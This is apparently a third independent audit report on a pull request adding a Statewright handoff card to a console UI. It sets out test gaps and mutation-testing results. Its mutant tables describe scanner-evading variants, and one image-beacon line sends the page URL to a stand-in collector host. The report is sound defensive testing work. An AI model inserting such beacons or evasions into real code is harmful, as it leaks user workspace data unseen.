# AUDIT REPORT (iteration 3, third audit after VETOs #938 and #939): PR #653 / issue #652, Statewright website-first handoff

- **Auditor role:** independent Judge (/qor-audit). No authorship of the change, of either remediation or of either earlier audit.
- **Date:** 2026-11-10
- **Exact source audited:** `45a78c4da50ad9ed22a7976f58533df7c2625981` (`git rev-parse HEAD` in `C:\dev\mythologiq\FailSafe-653`, branch `feat/652-statewright-website-handoff`)
- **Base:** `origin/main` = `9f16548d83116e2d8ee7f9010545963c06e5c93a`
- **Previously audited:** `1fd4a557` (VETO, ledger #938), `dd766c15` (VETO, ledger #939)
- **Plan:** `.failsafe/governance/plans/plan-v6013-statewright-652-website-first.md`, iteration 3 (LF sha256 `db68d80907cf6e787f28690984a50eca200105c11758e5fe21aadef99ef8644f`, equal to `plan_content_hash` in `plan-iter3.json`)
- **Environment:** Windows 11, Node 22.23.4, Playwright Chromium. No request reached `statewright.ai`: Playwright routes fulfilled the host locally, Chromium ran with `--host-resolver-rules=MAP * 127.0.0.1` for every mutation and probe run, and a Node preload refused every non-local DNS lookup (it logged and refused 54 lookups of `statewright.ai` made by jsdom's WebSocket under mutant X12).

## Verdict: VETO

One blocking finding that I consider solid under any reading of the verdict rule (B1), and one that is a boundary call (B2). The verdict does not depend on B2.

- **B1.** A one-character slip in the card's own stylesheet (`font-size:.88rem` to `.08rem`), or a colour value equal to the card background, makes the disclaimer unreadable in Chromium while every suite stays green. The rule names "removes or hides the card or its disclaimer" as blocking when the mutant is a plausible accident or easy to miss in review. Both are.
- **B2.** One plain added line makes a click on any integration's Configure button open Statewright in a new tab, with every suite green. It is the behaviour of the previous audit's X17, which the plan lists as killed; X17 is killed only by a text scan, and the natural way of writing the same behaviour passes it.

What is sound: the shipped source has no defect that I could find. It is static, makes no provider call, sends nothing and claims no connection. R1 and R2 of the second audit are closed as written. All 22 mutants of the first audit and 30 of the 32 of the second are killed (the two survivors, X15 and X16, are the unchanged-code cosmetic ones the second audit already ruled non-blocking). Razor limits hold. Regression guards pass. No flakiness in 45 repeated Playwright tests plus 50 further green runs of the two specs under heavy machine load.

**If the Governor's bar were "shipped source sound and previous findings closed", this would be a PASS.** Under the rule I was given it is a VETO, and B1 is a fair hit under that rule, not a contrived one: it is the same gap as N3/X21 of the second audit (disclaimer can be hidden), which the plan says is closed ("no ... hiding rule").

### On the verdict rule itself

I report under the rule as written. Two observations, as the brief allows:

1. The rule defines two classes (plausible, and obfuscated). My survivors fall into three. The third is a plainly written, deliberate edit whose intent is self-evident in a diff (for example a line that sets the pill text to the literal `'Connected'`). It is not obfuscated, it is not an accident, and a reviewer would not plausibly miss it. I treated that class as **non-blocking**, following the rule's own rationale that code review is the control for a malicious author. If the Governor reads the rule the other way, nine more survivors become blocking (listed in N1). The remediation below closes most of them anyway.
2. "Any surviving mutant" has no natural end: I produced 28 survivors from 51 new mutants, and a fourth auditor would produce more. The loop ends only if the bar is a fixed list. I propose one in "Required remediation": pin what is static by equality, and observe the provider across a fixed set of operator and runtime triggers. Anything beyond that list belongs to code review and to a Content-Security-Policy on the Console, which would make provider contact impossible whatever the code says (carried N10, outside this change).

## Risk grade: L2

Unchanged from both earlier audits. User-facing navigation to a third-party site and product-truth copy about that third party. No credential handling, no data egress by FailSafe, no backend, schema or dependency change, so not L3. This iteration changed tests and governance files only.

## Status of R1 and R2

| Finding | Status | Evidence |
|---|---|---|
| **R1** provider contacted or opened without a click, or given a workspace value (X09, X12, X24, X26) | **Closed as written.** Residual: B2 | X09: source 2, jsdom 6, Playwright fails (mouse-click test never reaches the fixed URL). X12: source 2, Playwright fails with `{ referer: 'websocket', url: 'wss://statewright.ai/live?w=%3Fworkspace%3Dsecret-workspace' }` in the provider list, which proves `routeWebSocket` intercepts a socket opened by the page. X26: source 2, jsdom 6, Playwright fails (2 pages). X24: source 2 only; neither behavioural suite sees a 12 s delay, which no finite idle can |
| **R2** false "Connected" status (X22, X29, X30) | **Closed as written.** Residual: B1 (same family as N3/X21) | X22: source 1, Playwright fails on generated content. X29: source 1, jsdom 3, Playwright fails (5 lines name Statewright). X30: source 1, jsdom 6. X21: source 1, Playwright fails on `toBeVisible` |
| Survivors X15, X16, X17, X21 | X17 and X21 killed; X15, X16 survive | X17 is killed by the source text scan only (jsdom 0, Playwright pass): see B2. X15 and X16 restyle or relabel other integrations' cards in code this change does not touch; non-blocking, as before |
| N1, N2 of audit 2 | Closed | `integration-catalog-renderer.test.ts` is blob `b2b261cc` on HEAD and on `origin/main` |
| N8 of audit 2 | Closed | Global timers are counted and call through; `global.setTimeout`, `setInterval` and `fetch` are identical to the originals after the suites (measured) |

Byte-identity claims, checked with `git rev-parse <rev>:<path>`:

| File | `origin/main` | `dd766c15` | HEAD |
|---|---|---|---|
| `src/roadmap/ui/modules/integration-catalog-renderer.js` | `d2308b43` | `8a15f1ae` | `8a15f1ae` |
| `src/roadmap/ui/modules/statewright-handoff.js` | absent | `fda005ad` | `fda005ad` |
| `src/test/roadmap/integration-catalog-renderer.test.ts` | `b2b261cc` | | `b2b261cc` |
| `src/test/ui/integrations-catalog.spec.ts` | `2a75d9fa` | | `2a75d9fa` |

Commit `45a78c4d` touches three test files, the plan and four `.qor` gate files, and nothing else.

## Blocking findings

### B1. The disclaimer can be made unreadable by a one-character or one-value change, with every suite green

Rule item broken: "removes or hides the card or its disclaimer". Plan claim contradicted: iteration 3, R2, "a closed list of five selectors and twelve presentational properties, with no generated content, **hiding rule** or remote resource".

| ID | Mutation of `statewright-handoff.js` (`STATEWRIGHT_STYLES`) | source | jsdom | Playwright | Chromium probe |
|---|---|---|---|---|---|
| Y18 | `.cc-intcat-statewright p { ... font-size:.88rem }` becomes `.08rem` (one character) | 0 | 0 | 9 pass | computed font-size `1.28px`; the paragraph's box is 1050 x **1** px (38 px unmutated) |
| Y17 | same rule, `color:#a9b8cb` becomes `#182332` (the card's own background colour) | 0 | 0 | 9 pass | computed colour `rgb(24, 35, 50)` on a `linear-gradient(rgb(24, 35, 50), rgb(17, 26, 37))` background |
| Y19 | same rule, `color:transparent` | 0 | 0 | 9 pass | computed colour `rgba(0, 0, 0, 0)` |
| Y20 | same rule, `margin:0 0 10px -300vw` | 0 | 0 | 9 pass | box x = -3635 px, outside the viewport |
| Y16 | renderer `STYLE` gains `.cc-intcat section p { opacity:0; }` | 0 | 0 | 9 pass | computed opacity `0` |

Class: Y18 is a plausible accident (a typo). Y17 is easy to miss in review (a hex colour does not say that it equals the background). Y19, Y20 and Y16 are plainly written and listed for the root cause; I do not rest the finding on them.

Root causes:

1. The source test closes the list of selectors and property **names** but not the **values**. Its deny pattern covers `display:none` and `font-size:0` followed by anything but a dot; `.08rem`, `0.01px`, colours, margins and `font` shorthands pass.
2. Playwright's `toBeVisible()` is true for any element with a non-empty box that is not `visibility:hidden`. A 1 px-tall paragraph, transparent or background-coloured text, `opacity:0` and an off-screen box are all "visible".
3. The renderer's own `STYLE` constant, which shares `.cc-intcat-head`, `.cc-intcat-pill` and `.cc-intcat-actions` with the card and can target `section p`, is covered by no style assertion at all.

### B2. A Configure click on another integration can open Statewright, with every suite green (boundary call)

Rule items broken: "contacts or opens Statewright without a deliberate activation of the link"; required negative "no automatic calls to Statewright"; plan falsification item 1.

| ID | Mutation of `integration-catalog-renderer.js` | source | jsdom | Playwright | Chromium probe |
|---|---|---|---|---|---|
| Y06 | in the existing Configure click handler, after `settingsTab.click()`: `document.querySelector('.cc-intcat-web-link').click();` | 0 | 0 | 9 pass | clicking Linear's Configure opened a second page at `https://statewright.ai/runs` and one `GET https://statewright.ai/runs` |

Why I call it blocking: the line uses no trick. Clicking the link is the natural way to write "also open the link". It names neither the provider nor any API on the deny list, so nothing in it tells a reviewer that it reaches a third party; the class name `cc-intcat-web-link` is defined in another file. It is the behaviour of X17, which the plan counts among "the auditor's nine Statewright-related survivors ... All are killed". X17 as literally written is killed, but only by the source text scan (jsdom 0, Playwright pass). No behavioural test observes the provider across a Configure click: `integrations-catalog.spec.ts` clicks Configure with no provider watch, and `statewright-handoff.spec.ts` never clicks it.

Why it is a boundary call: it is not a plausible accident, and a careful reviewer would ask what the line is for. If the Governor holds that this is code review's job, B2 moves to N1 and B1 stands alone.

### Required remediation (a fixed list, so that the loop can end)

1. **Pin `STATEWRIGHT_STYLES` by string equality**, as the card markup already is. One assertion. Kills Y17, Y18, Y19, Y20, Y43, Y50, Y51, Y52 and every other value mutant of that constant. The second audit suggested this ("or pin the constant by equality").
2. **Playwright, computed readability of the disclaimer, the link and the address**: `opacity` 1 on the element and its ancestors up to the card, `font-size` at least 11 px, text colour different from the background colour, box inside the viewport. Kills Y16 and covers the renderer `STYLE`, which no source pin covers.
3. **Playwright, provider watch across the other triggers**: with `watchProvider` active, click a Configure button, dispatch one hub event through `__failsafeRenderers.integrations.onEvent`, re-render at least six times, wheel over the catalog and right-click the link; then require an empty provider list, one page, the unchanged `href`, the unchanged pill text and the unchanged document title. Kills Y05, Y06, Y07, Y08, Y10, Y13, Y34, Y45, Y47, Y48 and Y53.
4. Optional, cheap: make the handler pattern case-insensitive and add `setAttribute\(\s*['"]on`; assert the `h3` text is exactly `Integration Catalog` (Y23); allow only `div.cc-intcat-group` elements that precede a card (Y30); pin the error status line as `Could not load integrations: ` followed by the error text only (Y21, Y41).

## Non-blocking findings

- **N1. Plain, self-evident survivors (class "plain").** Each breaks an item and survives all suites, but its intent is evident in a diff, so under the rule's rationale code review is the control. Chromium-confirmed unless stated.
  - Y05: Configure click loads a detached `<img>` from the link's `href` (one `GET https://statewright.ai/runs`).
  - Y07: `onEvent()` does the same on every hub event (one GET per event).
  - Y48: `onEvent()` sets the Statewright pill text to `Connected` (pill read `CONNECTED` after one hub event).
  - Y45: a top-level statement in `statewright-handoff.js` sets `document.title = 'Statewright: connected'` (tab title confirmed).
  - Y15: renderer `STYLE` adds `.cc-intcat-sub::after { content:" Run history provider: connected, signed in." }` directly above the card. Playwright checks generated content only inside the card.
  - Y23: the heading becomes `Integration Catalog · run history connected` in all three states. No test pins the heading text.
  - Y30, Y41: in the catalog-failure state only, a group label `Connected · signed in` under the card, or `— run history provider connected` appended to the error line.
  - Y16: see B1.
- **N2. Evasive survivors (class "obfuscated").** Written to pass the text scans or to outlast the 4 s idle; non-blocking by rule.
  - Y08, Y53: mixed-case inline handlers (`onWheel=`, `onContextMenu=`) on the wrapper `div`. The pattern `\bon[a-z]+\s*=` is case-sensitive; HTML attribute names are not. Y08 contacts the provider on scroll; Y53 appends `?workspace=secret-workspace` to the link on right-click (confirmed).
  - Y10: `container.setAttribute('oncontextmenu', ...)`, same leak (confirmed). jsdom does not run inline handlers, so the jsdom `contextmenu` poke does not see it; the same code with `addEventListener` reached through an alias (Y35) **is** killed by jsdom.
  - Y13: `statewright-handoff.js`, at import, `document.body.setAttribute('onwheel', ...)`; provider request on scroll (confirmed).
  - Y34: `container['addEventListener']` through a variable on `wheel`; provider request on scroll (confirmed). The listener count stays 1.
  - Y26: `const idle = window.requestIdleCallback` loop that clicks the link after 7 s (four pages opened within 9 s in the probe). Y28: `link.animate([], 6000).finished.then(...)` (provider requests after 6 s). Same class as X24.
  - Y47: a render counter changes the pill to `Connected` from the sixth render (confirmed after seven).
  - Y21: `State&shy;wright connected` in the error line; the soft hyphen defeats every `/statewright/i` scan.
- **N3. The test "the handoff module contains no code: three constants and nothing that runs" passes with code that runs.** Y12 (`if (typeof document !== 'undefined') document.createElement('img').src = STATEWRIGHT_RUNS_URL;`), Y13 and Y45 all pass it. Y12 is still killed, by Playwright. The test is not vacuous (it kills arrow functions, `new`, listeners and the listed APIs) but its title promises more than it checks. Pinning the whole module by equality or by hash would make the title true.
- **N4. Workspace value to a different host.** Y25 (`document.createElement('img').src = 'https://collector.example/?u=' + encodeURIComponent(document.URL)` in `render()`) survives all suites; the probe saw the request with `workspace=secret-workspace`. I decided that the required negative "no credentials, workspace information or identifiers transmitted" is, in this change's scope, about Statewright: the verdict rule says "to Statewright", and a generic exfiltration is equally possible on `main` and has nothing to do with the Statewright code. Non-blocking here. The control is a CSP on the Console (carried N10).
- **N5. Same root cause as B1, lesser effect.** Y43 (link label colour equals its background; the bordered box remains and still works), Y52 (visible address colour equals the card background), Y44 (shared `.cc-intcat-pill` colour turned green; only the Statewright pill has no state class, so only it changes; cosmetic), Y50 (padding 14 px to 16 px, harmless control). All survive. Remediation 1 and 2 cover them.
- **N6. X17 and X24 are killed only by the source text scan.** No behavioural test fails for either. For X24 that is inherent; for X17 see B2.
- **N7. Source-contract brittleness (maintainability, not a defect).** Harmless edits to unrelated parts of the renderer fail the source test: a comment that names the card (H1), a local named `once` (H2, matched by `\bon[a-z]+\s*=`), the words `history.` in an unrelated string (H3, matched by `ACTIVE`), a retry of the same-origin catalog fetch (H5), a second listener on the Configure buttons (H6). A new CSS rule for an unrelated class passes (H4). The failure messages are clear, and the plan says this is the intent ("any new behaviour in these two files fail a named test and require review"). Prose such as `open (`, `location.` or `import.` in any future renderer string will also trip `ACTIVE`.
- **N8. jsdom harness residue and reach.** After `cleanup()`, `global.setTimeout`, `setInterval` and `fetch` are the originals, but `window`, `document` and `requestAnimationFrame` remain as own keys of `global` with value `undefined` (they were absent before). Harmless for `typeof` checks; not a faithful restore. The harness dispatches base `Event` objects for ten event types; it does not dispatch `click`, `wheel`, `scroll`, `copy` or `dragstart`, and does not stub `WebSocket` (X12: jsdom 0). The counting timers do not let a leak escape: window timers are counted and not run, global timers are counted and run (Y27, an aliased `window.setTimeout`, is killed by jsdom alone).
- **N9. Keyboard focus on the link is lost on every hub refresh.** `render()` replaces the container's `innerHTML`, and `command-center.js` calls `render()` on every hub payload. Probe: after `link.focus()` and one `render()`, `document.activeElement` is `BODY`. A refresh that lands between press and release would also drop a mouse click. This is the existing pattern for every catalog control, not introduced here, and activation works when it completes; but the link is the feature, so it is worth a follow-up issue.
- **N10. Plan wording.** (a) "no ... hiding rule" overstates the style test (B1). (b) "uses nothing that reaches a network, opens or moves a window, or runs later" describes a deny list; the plan's own "Not changed" paragraph concedes this. (c) "26 mutants ... All are killed": no evidence is in the repository. A file consistent with the claim exists outside it (session scratch `s653/mutation-iter3.txt`), and I independently confirm that the nine named survivors are killed. (d) The remote branch is still at `1fd4a557` (local is 4 ahead), so no CI run covers `dd766c15` or HEAD; the plan's open-items list now says so correctly. (e) The line-number sentence is now correct: the fetch is at line 197 on `main` and 198 at HEAD, and eleven contract documents cite 196.
- **N11. Slow failure mode.** M08, X09, Y09 and Y11 are killed by a 45 s test timeout in `opened.waitForURL(RUNS)`, not by an assertion. `expect(opened).toHaveURL(RUNS)` would fail in 5 s with a readable diff.
- **N12. Carried, unchanged.** No CSP or `Referrer-Policy` on the Console server; the Console page requests `fonts.googleapis.com` on load (seen and fulfilled locally in the probe; unrelated to Statewright and present on `main`); copy states third-party facts I could not check; `.agent/` is gitignored while the two earlier reports are tracked.

## Section 4 razor

Measured from the committed blobs at HEAD with the TypeScript parser. Limits: function 40 lines, file 250 lines, nesting 3.

| File (added or modified against `origin/main`) | Lines | Longest function | Max nesting |
|---|---|---|---|
| `src/roadmap/ui/modules/integration-catalog-renderer.js` | 245 (243 on main) | `render` 38 | 2 block levels (`for` + `if`); a three-term chained ternary in `card`, unchanged from main |
| `src/roadmap/ui/modules/statewright-handoff.js` | 28 | none | 0 |
| `src/test/roadmap/statewright-handoff-source.test.ts` | 84 | `suite` callback 26 | 0 |
| `src/test/roadmap/statewright-handoff.test.ts` | 143 | `cardContract` 23 | 1 |
| `src/test/ui/statewright-handoff.spec.ts` | 109 | test callback 23 | 1 |

No breach. The two changelogs gain one identical three-line entry under Unreleased.

## Mutation tables

Method. Each mutant was applied alone to a disposable `git archive` export of HEAD (never to the audited worktree), `copy-ui-js` was run, then the three mocha files and the two Playwright specs. Columns `source`, `jsdom` and `catalog` are failing-test counts in `statewright-handoff-source.test`, `statewright-handoff.test` and `integration-catalog-renderer.test` (32 tests in all). Playwright ran fail-fast (`-x`), so its column is FAIL (at least one of 9 failed) or pass (9 of 9). M01 to X32 use the **second auditor's own definitions**, found unmodified in the session scratch directory (`muts.cjs`, sha256 `48d3dacb...`); the shipped files are byte-identical to the ones those definitions were written for, and every anchor matched exactly once.

### M01 to M22 (first audit)

| ID | Mutation | source | jsdom | catalog | Playwright | Result |
|---|---|---|---|---|---|---|
| M01 | 1x1 `<img>` beacon in the card | 1 | 12 | 0 | FAIL | killed |
| M02 | `<link rel="preconnect">` in the card | 1 | 12 | 0 | pass | killed |
| M03 | `<link rel="prefetch">` of `/runs` | 1 | 12 | 0 | FAIL | killed |
| M04 | `fetch` of a provider URL in `render()` | 2 | 12 | 0 | FAIL | killed |
| M05 | hidden `<iframe>` of `/runs` | 1 | 12 | 0 | FAIL | killed |
| M06 | `ping` on the anchor | 1 | 18 | 0 | FAIL | killed |
| M07 | `?utm_source=failsafe` on the href | 1 | 12 | 0 | FAIL | killed |
| M08 | click handler appends `?ws=<page URL>` | 2 | 0 | 0 | FAIL | killed |
| M09 | drop `noreferrer` | 1 | 12 | 0 | FAIL | killed |
| M10 | drop `target` and `noopener` | 1 | 12 | 0 | FAIL | killed |
| M11 | extra "Connected" pill, observed class | 1 | 6 | 0 | FAIL | killed |
| M12 | copy adds signed in, partner, synced | 1 | 6 | 0 | pass | killed |
| M13 | card also carries `cc-intcat-card` | 1 | 6 | 1 | FAIL | killed |
| M14 | header count + 1 | 0 | 0 | 1 | pass | killed (pre-existing test only) |
| M15 | no handoff in the fetch-failure markup | 1 | 6 | 0 | FAIL | killed |
| M16 | handoff only when the catalog is non-empty | 0 | 6 | 0 | pass | killed |
| M17 | `window.open` of `/runs` on render | 2 | 6 | 0 | FAIL | killed |
| M18 | auto-click of the link after 3 s | 1 | 6 | 0 | FAIL | killed |
| M19 | "Connect account" button in the card | 1 | 12 | 0 | pass | killed |
| M20 | `tabindex="-1" aria-hidden="true"` | 1 | 12 | 0 | pass | killed |
| M21 | no handoff in the loading markup | 1 | 3 | 0 | pass | killed |
| M22 | other cards lose their Docs link | 0 | 0 | 1 | pass | killed (pre-existing test only) |

22 of 22 killed.

### X01 to X32 (second audit)

| ID | Mutation | source | jsdom | catalog | Playwright | Result |
|---|---|---|---|---|---|---|
| X01 | second, empty anchor to the provider login | 1 | 12 | 0 | pass | killed |
| X02 | `onmouseover` attribute rewrites the href | 2 | 18 | 0 | FAIL | killed |
| X03 | `rel` gains `opener` | 1 | 12 | 0 | FAIL | killed |
| X04 | `rel` reordered (harmless control) | 1 | 12 | 0 | FAIL | killed (tests stricter than needed) |
| X05 | `<meta http-equiv="refresh">` after the card | 1 | 12 | 0 | pass | killed |
| X06 | `<base href>` to the provider in `<head>` | 1 | 6 | 0 | pass | killed |
| X07 | `navigator.sendBeacon` with the page query | 2 | 0 | 0 | FAIL | killed |
| X08 | `new Image()` beacon in the constructor | 2 | 0 | 0 | FAIL | killed |
| X09 | `mousedown` listener rewrites the href (**R1**) | 2 | 6 | 0 | FAIL | killed (was SURVIVED) |
| X10 | URL constant changed to `http:` | 1 | 12 | 0 | FAIL | killed |
| X11 | URL constant changed to a look-alike host | 1 | 12 | 0 | FAIL | killed |
| X12 | `WebSocket` to the provider with the page query (**R1**) | 2 | 0 | 0 | FAIL | killed (was SURVIVED) |
| X13 | `EventSource` to the provider | 2 | 0 | 0 | FAIL | killed |
| X14 | card injected twice | 1 | 9 | 0 | FAIL | killed |
| X15 | disabled cards styled as configured | 0 | 0 | 0 | pass | SURVIVED, non-blocking (unchanged code, other integrations, cosmetic) |
| X16 | Configure relabelled "Connect" | 0 | 0 | 0 | pass | SURVIVED, non-blocking (as X15) |
| X17 | Configure click also opens Statewright | 2 | 0 | 0 | pass | killed, by the text scan only (was SURVIVED); see B2 |
| X18 | card moved after the catalog sections | 0 | 2 | 0 | pass | killed |
| X19 | card wrapped inside an integration card | 0 | 6 | 1 | FAIL | killed |
| X20 | visible address differs from the link | 2 | 6 | 0 | FAIL | killed |
| X21 | style rule hides the disclaimer (`display:none`) | 1 | 0 | 0 | FAIL | killed (was SURVIVED); see B1 |
| X22 | `::after` adds "Connected" to the pill (**R2**) | 1 | 0 | 0 | FAIL | killed (was SURVIVED) |
| X23 | `::after` overlays the page with the link | 1 | 0 | 0 | FAIL | killed |
| X24 | `scheduler.postTask` navigates after 12 s (**R1**) | 2 | 0 | 0 | pass | killed, by the text scan only (was SURVIVED) |
| X25 | click listener sends an extra beacon | 2 | 0 | 0 | FAIL | killed |
| X26 | hovering the card opens `/runs` (**R1**) | 2 | 6 | 0 | FAIL | killed (was SURVIVED) |
| X27 | `window.open` in the catalog-failure branch | 2 | 4 | 0 | FAIL | killed |
| X28 | same-tab `location.assign` after render | 2 | 0 | 0 | FAIL | killed |
| X29 | status line claims Statewright connected (**R2**) | 1 | 3 | 0 | FAIL | killed (was SURVIVED) |
| X30 | pill `title`/`aria-label` say Connected (**R2**) | 1 | 6 | 0 | pass | killed (was SURVIVED) |
| X31 | stylesheet `background:url(provider)` | 1 | 0 | 0 | FAIL | killed |
| X32 | `window.open` on the second and later render | 2 | 0 | 0 | FAIL | killed |

30 of 32 killed. Survivors X15 and X16, both non-blocking.

### Y01 to Y53 (this audit; 51 run)

Y39 and Y42 were withdrawn before running (a no-op and a contrived duplicate). File: R = renderer, H = handoff module. No renderer mutant spells the provider name unless stated. Class: **plausible** (accident, or easy to miss in review), **plain** (unobfuscated, intent evident in a diff), **obfuscated** (written to pass the scans or outlast the idle), **equivalent** (no item broken). "Probe" = behaviour confirmed in Chromium against the real Console server.

| ID | File | Mutation | source | jsdom | catalog | Playwright | Result | Class | Item broken |
|---|---|---|---|---|---|---|---|---|---|
| Y01 | R | `window['op' + 'en'](link.href)` on render | 0 | 6 | 0 | FAIL | killed | obfuscated | |
| Y02 | R | `const w = window; w.open(link.href)` | 1 | 6 | 0 | FAIL | killed | plain | |
| Y03 | R | `const { open: go } = window; go(link.href)` | 0 | 6 | 0 | FAIL | killed | obfuscated | |
| Y04 | R | detached `<img>` with the link href on render | 0 | 0 | 0 | FAIL | killed (Playwright only) | plain | |
| Y05 | R | Configure click loads `<img>` from the link href | 0 | 0 | 0 | pass | **SURVIVED** | plain | provider contacted without activating the link. Probe: 1 GET |
| Y06 | R | Configure click also clicks the Statewright link | 0 | 0 | 0 | pass | **SURVIVED, blocking (B2)** | plausible (boundary) | provider opened without activating the link. Probe: new page + 1 GET |
| Y07 | R | `onEvent()` loads `<img>` from the link href | 0 | 0 | 0 | pass | **SURVIVED** | plain | automatic provider call on every hub event. Probe: 1 GET |
| Y08 | R | wrapper `div` gains `onWheel="..."` (mixed case) | 0 | 0 | 0 | pass | **SURVIVED** | obfuscated | provider contacted on scroll. Probe: 1 GET |
| Y09 | R | `container.setAttribute('onmousedown', ...)` appends the page query | 0 | 0 | 0 | FAIL | killed (Playwright only) | obfuscated | |
| Y10 | R | `container.setAttribute('oncontextmenu', ...)` appends the page query | 0 | 0 | 0 | pass | **SURVIVED** | obfuscated | workspace value in the link after right-click. Probe: `...runs?workspace=secret-workspace` |
| Y11 | H | import time: computed `addEventListener` with a `handleEvent` object on `mousedown` | 0 | 0 | 0 | FAIL | killed (Playwright only) | obfuscated | |
| Y12 | H | import time: plain statement loads `<img>` from the provider | 0 | 0 | 0 | FAIL | killed (Playwright only); passes "contains no code" | plain | |
| Y13 | H | import time: `document.body.setAttribute('onwheel', ...)` | 0 | 0 | 0 | pass | **SURVIVED** | obfuscated | provider contacted on scroll. Probe: 1 GET |
| Y14 | R | `STYLE`: `section .cc-intcat-pill::after { content:" · Connected" }` | 0 | 0 | 0 | FAIL | killed (Playwright only) | plain | |
| Y15 | R | `STYLE`: `.cc-intcat-sub::after` says "Run history provider: connected, signed in." | 0 | 0 | 0 | pass | **SURVIVED** | plain | false status above the card, provider not named. Probe: content present |
| Y16 | R | `STYLE`: `.cc-intcat section p { opacity:0 }` | 0 | 0 | 0 | pass | **SURVIVED (B1 root cause)** | plain | disclaimer hidden. Probe: opacity 0 |
| Y17 | H | disclaimer `color` becomes the card background colour | 0 | 0 | 0 | pass | **SURVIVED, blocking (B1)** | plausible | disclaimer hidden. Probe: `rgb(24, 35, 50)` |
| Y18 | H | disclaimer `font-size:.88rem` becomes `.08rem` | 0 | 0 | 0 | pass | **SURVIVED, blocking (B1)** | plausible | disclaimer hidden. Probe: 1.28 px, box 1 px tall |
| Y19 | H | disclaimer `color:transparent` | 0 | 0 | 0 | pass | **SURVIVED (B1 root cause)** | plain | disclaimer hidden. Probe: `rgba(0, 0, 0, 0)` |
| Y20 | H | disclaimer `margin:0 0 10px -300vw` | 0 | 0 | 0 | pass | **SURVIVED (B1 root cause)** | plain | disclaimer hidden. Probe: x = -3635 |
| Y21 | R | error line gains `State&shy;wright connected` | 0 | 0 | 0 | pass | **SURVIVED** | obfuscated | false status (catalog-failure state). Probe: text shown |
| Y22 | R | loaded status line gains "Run history provider connected." | 0 | 3 | 0 | pass | killed (jsdom only) | plain | |
| Y23 | R | heading becomes "Integration Catalog · run history connected" | 0 | 0 | 0 | pass | **SURVIVED** | plain | false status near the card, provider not named. Probe: heading shown |
| Y24 | R | `<img>` to `'https://state' + 'wright.ai/t?'` + page URL on render | 0 | 0 | 0 | FAIL | killed (Playwright only) | obfuscated | |
| Y25 | R | `<img>` to another host carrying the page URL | 0 | 0 | 0 | pass | **SURVIVED** | plain | none in scope (N4). Probe: request with `workspace=secret-workspace` |
| Y26 | R | aliased `requestIdleCallback` loop clicks the link after 7 s | 0 | 0 | 0 | pass | **SURVIVED** | obfuscated | provider opened without a click. Probe: 4 pages within 9 s |
| Y27 | R | `const later = window.setTimeout; later(click, 6000)` | 0 | 6 | 0 | pass | killed (jsdom only) | obfuscated | |
| Y28 | R | `link.animate([], 6000).finished.then(<img>)` | 0 | 0 | 0 | pass | **SURVIVED** | obfuscated | automatic provider call. Probe: GETs after 6 s |
| Y29 | R | hidden `<iframe>` of the link href appended on render | 0 | 3 | 0 | FAIL | killed | plain | |
| Y30 | R | error state: group label "Connected · signed in" under the card | 0 | 0 | 0 | pass | **SURVIVED** | plain | false status (catalog-failure state), provider not named. Probe: `CONNECTED · SIGNED IN` shown under the card |
| Y31 | R | every Docs link retargeted to the link href | 0 | 1 | 1 | pass | killed | plain | |
| Y32 | R | `Reflect.apply(window.open, window, [link.href])` | 0 | 6 | 0 | FAIL | killed | obfuscated | |
| Y33 | R | `window.open?.(link.href)` | 0 | 6 | 0 | FAIL | killed | obfuscated | |
| Y34 | R | `container[name]('wheel', ...)` with `name = 'addEventListener'` | 0 | 0 | 0 | pass | **SURVIVED** | obfuscated | provider contacted on scroll. Probe: 1 GET |
| Y35 | R | same alias on `contextmenu`, appends the page query | 0 | 3 | 0 | pass | killed (jsdom only) | obfuscated | |
| Y36 | R | `form.submit()` to the link href in a new tab on render | 0 | 0 | 0 | FAIL | killed (Playwright only) | plain | |
| Y37 | R | link `search` set from `document.URL` on render | 0 | 9 | 0 | FAIL | killed | plain | |
| Y38 | R | `STYLE`: `.cc-intcat-actions a { pointer-events:none }` | 0 | 0 | 0 | FAIL | killed (Playwright only) | plain | |
| Y40 | R | Statewright pill gains the observed status class after render | 0 | 3 | 0 | pass | killed (jsdom only) | plain | |
| Y41 | R | error line gains "— run history provider connected" | 0 | 0 | 0 | pass | **SURVIVED** | plain | false status (catalog-failure state), provider not named. Probe: text shown |
| Y43 | H | link label colour equals its background | 0 | 0 | 0 | pass | **SURVIVED** | plausible | link label unreadable (box and function remain); N5. Probe: `rgb(20, 26, 34)` on the same |
| Y44 | R | shared `.cc-intcat-pill` colour turned green | 0 | 0 | 0 | pass | **SURVIVED** | plausible | none (cosmetic); N5. Probe: `rgb(104, 211, 145)` |
| Y45 | H | import time: `document.title = 'Statewright: connected'` | 0 | 0 | 0 | pass | **SURVIVED**; passes "contains no code" | plain | false status in the tab title. Probe: title confirmed |
| Y46 | R | loaded state places `STATEWRIGHT_HANDOFF.replace('Website handoff', 'Connected')` | 0 | 3 | 0 | FAIL | killed | plain | |
| Y47 | R | render counter: pill says "Connected" from the 6th render | 0 | 0 | 0 | pass | **SURVIVED** | obfuscated | false status. Probe: `CONNECTED` after 7 renders |
| Y48 | R | `onEvent()` sets the pill text to "Connected" | 0 | 0 | 0 | pass | **SURVIVED** | plain | false status. Probe: `CONNECTED` after one hub event |
| Y49 | R | Configure click sets `window.location` to the link href | 0 | 0 | 0 | FAIL | killed (older spec only) | plain | |
| Y50 | H | card padding 14 px to 16 px (harmless control) | 0 | 0 | 0 | pass | SURVIVED | equivalent | none; shows style values are unpinned |
| Y51 | H | `background:image-set("https://statewright.ai/bg.png" 1x)` (remote resource without `url(`) | 0 | 0 | 0 | FAIL | killed (Playwright only); passes the "no remote resource" style test | plain | |
| Y52 | H | visible address colour equals the card background | 0 | 0 | 0 | pass | **SURVIVED** | plausible | copyable address hidden; N5. Not probed separately (same mechanism as Y17) |
| Y53 | R | wrapper `div` gains `onContextMenu="..."` appending the page query | 0 | 0 | 0 | pass | **SURVIVED** | obfuscated | workspace value in the link after right-click. Probe: confirmed |

23 killed, 28 survived. Blocking: Y17, Y18 (B1) and Y06 (B2, boundary). Same root cause as B1, class plain: Y16, Y19, Y20. Other plain survivors (N1): Y05, Y07, Y15, Y23, Y30, Y41, Y45, Y48. Obfuscated (N2): Y08, Y10, Y13, Y21, Y26, Y28, Y34, Y47, Y53. Out of scope, cosmetic or equivalent: Y25, Y43, Y44, Y50, Y52.

Notes on what the survivors show about the source-contract scans (attack item 2 of the brief):

- **Computed access, aliasing, destructuring, `Reflect`, optional call** of `window.open` all pass the regular expression, and all are killed behaviourally (jsdom `window.open` stub, Playwright page count). The scan is not the only line of defence there.
